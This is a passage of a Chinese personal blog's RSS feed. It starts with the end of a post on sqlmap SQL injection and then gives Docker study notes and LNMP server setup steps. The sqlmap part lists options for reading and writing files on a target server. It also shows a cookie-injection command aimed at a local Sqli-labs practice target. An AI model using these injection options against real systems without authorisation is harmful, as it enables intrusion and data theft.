&lt;p&gt;下面是一些好玩的注入命令：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--referer http://www.baidu.com   #伪造referer字段
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--is-dba    #判断当前用户是否有管理员权限
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--data=&amp;#34;uname=admin&amp;amp;passwd=admin&amp;amp;submit=Submit&amp;#34;  #抓取其post提交的数据填入
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--file-read &amp;#34;c:/test.txt&amp;#34; #读取目标服务器C盘下的test.txt文件
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--file-write  test.txt  --file-dest &amp;#34;e:/hack.txt&amp;#34;  #将本地的test.txt文件上传到目标服务器的E盘下，并且名字为hack.txt
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--proxy=&amp;#34;http://127.0.0.1:8080&amp;#34;    #指定代理
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--prefix=PREFIX     #注入payload字符串前缀
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--suffix=SUFFIX     #注入payload字符串后缀
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;使用星号（*）来指定注入点&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python sqlmap.py -u &amp;#34;http://127.0.0.1/Less-20/?id=1&amp;#34; --cookie=&amp;#34;uname=admin*&amp;#34; --banner
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;提示：&lt;code&gt;custom injection marker (&#39;*&#39;) found in option &#39;--headers/--user-agent/--referer/--cookie&#39;. Do you want to process it? [Y/n/q]&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;更多更全的命令可以参考下面博客：&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.freebuf.com/sectool/164608.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.freebuf.com/sectool/164608.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;或者官方文档……&lt;/p&gt;
&lt;p&gt;ps：感觉根据实际环境来修改现有的工具进行利用才是最nice的！&lt;/p&gt;
&lt;p&gt;参考：&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://blog.csdn.net/whatday/article/details/62059263&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://blog.csdn.net/whatday/article/details/62059263&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.anquanke.com/post/id/235846&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.anquanke.com/post/id/235846&lt;/a&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Docker学习</title>
        <link>https://proben1.github.io/2022/docker%E5%AD%A6%E4%B9%A0/</link>
        <pubDate>Thu, 14 Apr 2022 20:28:16 +0800</pubDate>
        
        <guid>https://proben1.github.io/2022/docker%E5%AD%A6%E4%B9%A0/</guid>
        <description>&lt;h1 id=&#34;docker&#34;&gt;Docker&lt;/h1&gt;
&lt;p&gt;Docker 是一个开源的应用容器引擎，基于 Go 语言并遵从 Apache2.0 协议开源。&lt;/p&gt;
&lt;p&gt;Docker 可以让开发者打包他们的应用以及依赖包到一个轻量级、可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。&lt;/p&gt;
&lt;p&gt;简单地说,就是用来创建容器的引擎.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://pic.imgdb.cn/item/6170b5a82ab3f51d9150630a.png&#34; &gt;
		&lt;img src=&#34;https://pic.imgdb.cn/item/6170b5a82ab3f51d9150630a.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h1 id=&#34;docker-架构&#34;&gt;Docker 架构&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;镜像（Image）&lt;/strong&gt;：Docker 镜像（Image），就相当于是一个 root 文件系统(rootfs)。比如官方镜像 ubuntu:16.04 就包含了完整的一套 Ubuntu16.04 最小系统的 root 文件系统。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;容器（Container）&lt;/strong&gt;：镜像（Image）和容器（Container）的关系，就像是面向对象程序设计中的类和实例一样，镜像是静态的定义，容器是镜像运行时的实体。容器可以被创建、启动、停止、删除、暂停等。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;仓库（Repository）&lt;/strong&gt;：仓库可看成一个代码控制中心，用来保存镜像。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Docker客户端与服务器（C/S架构）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code&gt;Docker&lt;/code&gt; 在运行时分为 &lt;code&gt;Docker 引擎（服务端守护进程）&lt;/code&gt; 和 &lt;code&gt;客户端工具&lt;/code&gt;，我们日常使用各种 &lt;code&gt;docker 命令&lt;/code&gt;，其实就是在使用 &lt;code&gt;客户端工具&lt;/code&gt; 与 &lt;code&gt;Docker 引擎&lt;/code&gt; 进行交互。&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://pic.imgdb.cn/item/6170bc782ab3f51d91543f34.jpg&#34; &gt;
		&lt;img src=&#34;https://pic.imgdb.cn/item/6170bc782ab3f51d91543f34.jpg&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;在Docker的术语里，&lt;strong&gt;一个只读层被称为镜像&lt;/strong&gt;，一个镜像是永久不会变的。
由于Docker使用一个统一文件系统，Docker进程认为整个文件系统是以读写方式挂载的。但是所有的变更都发生顶层的可写层，而下层的原始的只读镜像文件并未变化。由于镜像不可写，所以&lt;strong&gt;镜像是无状态的&lt;/strong&gt;。
&lt;strong&gt;Docker镜像可用于创建Docker容器。&lt;/strong&gt;
Docker镜像是由文件系统叠加而成，&lt;strong&gt;最底层是一个文件引导系统（bootfs）&lt;/strong&gt;。Docker用户几乎永远不会与引导系统有交互。
&lt;strong&gt;Docker镜像是一个只读的文件&lt;/strong&gt;，若要修改镜像内容只能重新制作或生成镜像。
在Docker镜像创建为Docker容器后，最底层的文件引导系统（bootfs)便会被卸载，此时的容器是可以进行读写操作的。&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://pic.imgdb.cn/item/6170bdc42ab3f51d9154ec22.png&#34; &gt;
		&lt;img src=&#34;https://pic.imgdb.cn/item/6170bdc42ab3f51d9154ec22.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;在利用Docker镜像创建容器时会在镜像的只读层上创建一层可写层作为最顶层。&lt;/p&gt;
&lt;p&gt;每一个镜像都可能依赖于由一个或多个下层的组成的另一个镜像，&lt;strong&gt;下层镜像是上层镜像的父镜像&lt;/strong&gt;。
一个没有任何父镜像的镜像，谓之&lt;strong&gt;基础镜像（Base Image）&lt;/strong&gt;：&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://pic.imgdb.cn/item/6170be0c2ab3f51d91551ac1.png&#34; &gt;
		&lt;img src=&#34;https://pic.imgdb.cn/item/6170be0c2ab3f51d91551ac1.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;图中的&lt;code&gt;add emacs&lt;/code&gt;便是&lt;code&gt;add Apache&lt;/code&gt;镜像的父镜像，而&lt;code&gt;Debian&lt;/code&gt;没有任何父镜像，我们便认为&lt;code&gt;Debian&lt;/code&gt;是基础镜像（Base Image）&lt;/p&gt;
&lt;p&gt;(文件引导系统在这里不视作一层镜像)&lt;/p&gt;
&lt;p&gt;在容器层中，用户看到的是一个叠加之后的文件系统。&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&#34;text-align:left&#34;&gt;文件操作&lt;/th&gt;
&lt;th style=&#34;text-align:left&#34;&gt;说明&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;添加文件&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;在容器中创建文件时，新文件被添加到容器层中。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;读取文件&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;在容器中读取某个文件时，Docker 会从上往下依次在各镜像层中查找此文件。一旦找到，立即将其复制到容器层，然后打开并读入内存。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;修改文件&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;在容器中修改已存在的文件时，Docker 会从上往下依次在各镜像层中查找此文件。一旦找到，立即将其复制到容器层，然后修改之。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;删除文件&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;在容器中删除文件时，Docker 也是从上往下依次在镜像层中查找此文件。找到后，会在容器层中**「记录下此删除操作」**。（只是记录删除操作）&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;只有当需要修改时才复制一份数据，这种特性被称作 Copy-on-Write。可见，容器层保存的是镜像变化的部分，不会对镜像本身进行任何修改。&lt;/p&gt;
&lt;h1 id=&#34;docker使用&#34;&gt;Docker使用&lt;/h1&gt;
&lt;p&gt;&lt;strong&gt;启动Docker&lt;/strong&gt;：&lt;code&gt;systemctl start docker&lt;/code&gt;
&lt;strong&gt;重启Docker&lt;/strong&gt;：&lt;code&gt;systemctl restart docker&lt;/code&gt;
&lt;strong&gt;开机启动Docker&lt;/strong&gt;：&lt;code&gt;systemctl enable docker&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;hello-world&#34;&gt;hello-world&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;拉取镜像&lt;/strong&gt;：&lt;code&gt;docker pull 镜像仓库/镜像名称&lt;/code&gt;
eg：&lt;code&gt;docker pull hello-world&lt;/code&gt; - 拉取hello-world镜像
示例命令省略了仓库地址，Docker便默认从官方仓库（registry.hub.docker.com）拉取镜像，实际命令等价于
&lt;code&gt;docker pull registry.hub.docker.com/hello-world&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;查看本地镜像&lt;/strong&gt;：&lt;code&gt;docker images&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://pic.imgdb.cn/item/6170c05a2ab3f51d91566ff7.jpg&#34; &gt;
		&lt;img src=&#34;https://pic.imgdb.cn/item/6170c05a2ab3f51d91566ff7.jpg&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;镜像的 &lt;code&gt;ID&lt;/code&gt; 唯一标识了镜像&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;利用镜像创建Docker容器&lt;/strong&gt;：&lt;code&gt;docker run 镜像名称&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://pic.imgdb.cn/item/6170c0c82ab3f51d9156ab7a.jpg&#34; &gt;
		&lt;img src=&#34;https://pic.imgdb.cn/item/6170c0c82ab3f51d9156ab7a.jpg&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;查看当前运行的所有容器&lt;/strong&gt;：&lt;code&gt;docker ps -a&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;docker镜像的使用&#34;&gt;Docker镜像的使用&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;拉取镜像&lt;/strong&gt;: &lt;code&gt;docker pull 仓库名:TAG&lt;/code&gt;
例如拉取一个Ubuntu 18.04的镜像作为基础镜像：&lt;code&gt;docker pull ubuntu:18.04&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;列出镜像&lt;/strong&gt;: &lt;code&gt;docker images&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;创建容器&lt;/strong&gt;: &lt;code&gt;docker run -ti idiswy/lnmp /bin/bash&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://pic.imgdb.cn/item/6170c5ca2ab3f51d915986ed.jpg&#34; &gt;
		&lt;img src=&#34;https://pic.imgdb.cn/item/6170c5ca2ab3f51d915986ed.jpg&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;也可以用&lt;code&gt;docker images&lt;/code&gt;时的镜像ID代替&lt;code&gt;仓库名:TAG&lt;/code&gt;的组合&lt;/p&gt;
&lt;p&gt;我们和一个容器产生了交互,在Shell中输入&lt;code&gt;exit&lt;/code&gt;即可停止该镜像回到原命令行。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;docker run 常用参数&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;-d:&lt;/strong&gt; 后台运行容器，并返回容器ID；&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;-p:&lt;/strong&gt; 指定端口映射，格式为：&lt;strong&gt;主机(宿主)端口:容器端口&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;-t:&lt;/strong&gt; 为容器重新分配一个伪输入终端，通常与 -i 同时使用；&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;-i:&lt;/strong&gt; 以交互模式运行容器，通常与 -t 同时使用；&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&amp;ndash;name=&amp;ldquo;nginx-lb&amp;rdquo;:&lt;/strong&gt; 为容器指定一个名称；&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;-e username=&amp;ldquo;ritchie&amp;rdquo;:&lt;/strong&gt; 设置环境变量；&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&amp;ndash;net=&amp;ldquo;bridge&amp;rdquo;:&lt;/strong&gt; 指定容器的网络连接类型，支持 bridge/host/none/container: 四种类型；&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;删除镜像&lt;/strong&gt;: &lt;code&gt;docker rmi 镜像名称/镜像ID&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;eg:删除刚刚拉取的hello-world&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://pic.imgdb.cn/item/6170c6a02ab3f51d915a07e6.jpg&#34; &gt;
		&lt;img src=&#34;https://pic.imgdb.cn/item/6170c6a02ab3f51d915a07e6.jpg&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;修改标签&lt;/strong&gt;: &lt;code&gt;docker tag 镜像ID 用户名/镜像名称:新标签&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;搜索镜像&lt;/strong&gt;: 使用&lt;code&gt;docker search&lt;/code&gt;命令来检索公开仓库中的镜像&lt;/p&gt;
&lt;p&gt;例如&lt;code&gt;docker search lamp&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://pic.imgdb.cn/item/6170e8572ab3f51d916fbdfb.jpg&#34; &gt;
		&lt;img src=&#34;https://pic.imgdb.cn/item/6170e8572ab3f51d916fbdfb.jpg&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;docker镜像的创建&#34;&gt;Docker镜像的创建&lt;/h2&gt;
&lt;p&gt;1.&lt;strong&gt;docker commit&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;先创建一个容器：&lt;code&gt;docker run -ti idiswy/lnmp /bin/bash&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;在根目录加入一个flag&lt;/p&gt;
&lt;p&gt;结束后输入&lt;code&gt;exit&lt;/code&gt; 来退出容器，现在我们的容器已经被我们改变了&lt;/p&gt;
&lt;p&gt;使用 &lt;code&gt;docker commit&lt;/code&gt; 命令来提交更新后的副本：
&lt;code&gt;docker commit -m &amp;quot;Added flag&amp;quot; -a &amp;quot;ginger&amp;quot; b70f3162e24e test/flag&lt;/code&gt;
其中，&lt;code&gt;-m&lt;/code&gt; 来指定提交的说明信息，跟我们使用的版本控制工具一样，&lt;code&gt;-a&lt;/code&gt; 可以指定更新的用户信息，之后是用来创建镜像的容器的ID，最后指定目标镜像的仓库名和 tag 信息。&lt;/p&gt;
&lt;p&gt;利用这个新镜像来创建一个容器,ok&lt;/p&gt;
&lt;p&gt;2.&lt;strong&gt;利用 Dockerfile 来创建镜像&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;之后再提&lt;/p&gt;
&lt;p&gt;3.&lt;strong&gt;从本地文件系统导入镜像&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker import - ubuntu:14.04
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker save -o ubuntu_18.04.tar ubuntu:18.04
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://pic.imgdb.cn/item/6170eca62ab3f51d91722a1a.jpg&#34; &gt;
		&lt;img src=&#34;https://pic.imgdb.cn/item/6170eca62ab3f51d91722a1a.jpg&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;docker容器的操作&#34;&gt;Docker容器的操作&lt;/h2&gt;
&lt;p&gt;启动容器我们共有两种方式：一种是&lt;strong&gt;基于镜像新建一个容器并启动&lt;/strong&gt;，另外一种是&lt;strong&gt;将在中止状态（Exited）的容器重新启动&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;前者: &lt;code&gt;docker start ID&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;后者: &lt;code&gt;docker start ID&lt;/code&gt;命令来启动已中止的容器&lt;/p&gt;
&lt;p&gt;相应的，我们也可以使用&lt;code&gt;docker stop/kill ID&lt;/code&gt;命令来&lt;strong&gt;停止运行中的容器&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;同时需要注意的是，我们在容器终端中输入&lt;code&gt;exit&lt;/code&gt;或Ctrl+D来退出终端时，容器也会自动中止。&lt;/p&gt;
&lt;p&gt;除此之外还可以使用&lt;code&gt;docker restart 容器ID&lt;/code&gt;命令来&lt;strong&gt;重启容器&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;docker logs ID&lt;/code&gt;命令来查看容器的输出信息&lt;/p&gt;
&lt;p&gt;在后台运行容器后，我们需要对容器进行操作时，可以使用&lt;code&gt;docker attach ID&lt;/code&gt;命令来对容器进行操作。&lt;/p&gt;
&lt;p&gt;也可以使用&lt;code&gt;docker exec -it ID 所执行命令&lt;/code&gt;来操作容器。&lt;/p&gt;
&lt;p&gt;注意&lt;strong&gt;在使用&lt;code&gt;docker exec&lt;/code&gt;命令后，退出终端时，容器依旧保持运行状态&lt;/strong&gt;，而在&lt;code&gt;docker attach&lt;/code&gt;命令打开终端退出后，容器便会中止。&lt;/p&gt;
&lt;p&gt;使用&lt;code&gt;docker rm ID&lt;/code&gt;命令来删除容器。&lt;/p&gt;
&lt;p&gt;注意，&lt;strong&gt;在删除容器前必须停止容器&lt;/strong&gt;，如果要删除一个运行中的容器，可以添加&lt;code&gt;-f&lt;/code&gt;参数来关闭并删除容器。&lt;/p&gt;
&lt;h2 id=&#34;docker网络&#34;&gt;Docker网络&lt;/h2&gt;
&lt;p&gt;可以通过&lt;code&gt;docker network ls&lt;/code&gt;命令查看网络模式&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Docker四种网络模式：&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;Bridge - 桥接网络模式&lt;/li&gt;
&lt;li&gt;Host - 开放式网络模式&lt;/li&gt;
&lt;li&gt;Container - 联合挂载式网络模式（Host网络模式的延伸）&lt;/li&gt;
&lt;li&gt;None - 封闭式网络模式&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;端口映射&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;docker run -it -p 物理机端口:容器端口 镜像名称:标签信息&lt;/code&gt; 此时&lt;strong&gt;指定的容器端口&lt;/strong&gt;便映射到了&lt;strong&gt;指定的物理机端口&lt;/strong&gt;上。同时&lt;code&gt;-p&lt;/code&gt;可以多次使用来绑定多个端口映射关系。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;eg：&lt;/p&gt;
&lt;p&gt;docker run -it -p 10001:80 idiswy/lnmp /bin/bash&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;使用&lt;code&gt;docker port 容器ID 端口&lt;/code&gt;即可查看当前映射的端口配置。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;删除所有已经停止的容器：&lt;code&gt;docker rm $(docker ps -a -q)&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;参考&#34;&gt;参考&lt;/h1&gt;
&lt;p&gt;Docker 架构及工作原理：https://www.cnblogs.com/mrhelloworld/p/docker2.html&lt;/p&gt;
&lt;p&gt;菜鸟教程：https://www.runoob.com/docker&lt;/p&gt;
&lt;p&gt;Docker学习笔记：https://www.cnblogs.com/yesec/p/15025511.html&lt;/p&gt;
</description>
        </item>
        <item>
        <title>LNMP环境搭建成功篇</title>
        <link>https://proben1.github.io/2022/lnmp%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E6%88%90%E5%8A%9F%E7%AF%87/</link>
        <pubDate>Thu, 14 Apr 2022 20:24:35 +0800</pubDate>
        
        <guid>https://proben1.github.io/2022/lnmp%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E6%88%90%E5%8A%9F%E7%AF%87/</guid>
        <description>&lt;p&gt;这里!!!https://lnmp.org/install.html&lt;/p&gt;
&lt;p&gt;su root&lt;/p&gt;
&lt;p&gt;yum install screen&lt;/p&gt;
&lt;p&gt;screen -S lnmp&lt;/p&gt;
&lt;p&gt;wget &lt;a class=&#34;link&#34; href=&#34;http://soft.vpser.net/lnmp/lnmp1.8.tar.gz&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://soft.vpser.net/lnmp/lnmp1.8.tar.gz&lt;/a&gt; -cO lnmp1.8.tar.gz &amp;amp;&amp;amp; tar zxf lnmp1.8.tar.gz &amp;amp;&amp;amp; cd lnmp1.8 &amp;amp;&amp;amp; ./install.sh lnmp&lt;/p&gt;
&lt;p&gt;一键安装&amp;hellip;&amp;hellip;&amp;hellip;省心&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Install lnmp takes 34 minutes.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Install lnmp V1.8 completed! enjoy it.
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;LNMP相关软件安装目录&lt;/strong&gt;
Nginx 目录: /usr/local/nginx/
MySQL 目录 : /usr/local/mysql/
MySQL数据库所在目录：/usr/local/mysql/var/
MariaDB 目录 : /usr/local/mariadb/
MariaDB数据库所在目录：/usr/local/mariadb/var/
PHP目录 : /usr/local/php/
多PHP版本目录 : /usr/local/php5.5/ 其他版本前面5.5的版本号换成其他即可
PHPMyAdmin目录 : 0.9版本为/home/wwwroot/phpmyadmin/ 1.0及以后版本为 /home/wwwroot/default/phpmyadmin/ 强烈建议将此目录重命名为其不容易猜到的名字。phpmyadmin可自己从官网下载新版替换。
默认网站目录 : 0.9版本为 /home/wwwroot/ 1.0及以后版本为 /home/wwwroot/default/
Nginx日志目录：/home/wwwlogs/
/root/vhost.sh添加的虚拟主机配置文件所在目录：/usr/local/nginx/conf/vhost/
PureFtpd 目录：/usr/local/pureftpd/
PureFtpd web管理目录： 0.9版为/home/wwwroot/default/ftp/ 1.0版为 /home/wwwroot/default/ftp/
Proftpd 目录：/usr/local/proftpd/
Redis 目录：/usr/local/redis/&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;LNMP相关配置文件位置&lt;/strong&gt;
Nginx主配置(默认虚拟主机)文件：/usr/local/nginx/conf/nginx.conf
添加的虚拟主机配置文件：/usr/local/nginx/conf/vhost/域名.conf
MySQL配置文件：/etc/my.cnf
PHP配置文件：/usr/local/php/etc/php.ini
php-fpm配置文件：/usr/local/php/etc/php-fpm.conf
PureFtpd配置文件：/usr/local/pureftpd/pure-ftpd.conf 1.3及更高版本：/usr/local/pureftpd/etc/pure-ftpd.conf
PureFtpd MySQL配置文件：/usr/local/pureftpd/pureftpd-mysql.conf
Proftpd配置文件：/usr/local/proftpd/etc/proftpd.conf 1.2及之前版本为/usr/local/proftpd/proftpd.conf
Proftpd 用户配置文件：/usr/local/proftpd/etc/vhost/用户名.conf
Redis 配置文件：/usr/local/redis/etc/redis.conf&lt;/p&gt;
&lt;p&gt;如果之前已经有php-fpm,就&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;killall php-fpm 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;lnmp restart
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://pic.imgdb.cn/item/60f790f55132923bf8935b6b.png&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://pic.imgdb.cn/item/60f790f55132923bf8935b6b.png&#34; &gt;
		&lt;img src=&#34;https://pic.imgdb.cn/item/60f790f55132923bf8935b6b.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;好啦!&lt;/p&gt;
</description>
        </item>
        <item>
        <title>LNMP环境搭建失败篇</title>
        <link>https://proben1.github.io/2022/lnmp%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%A4%B1%E8%B4%A5%E7%AF%87/</link>
        <pubDate>Thu, 14 Apr 2022 20:24:28 +0800</pubDate>
        
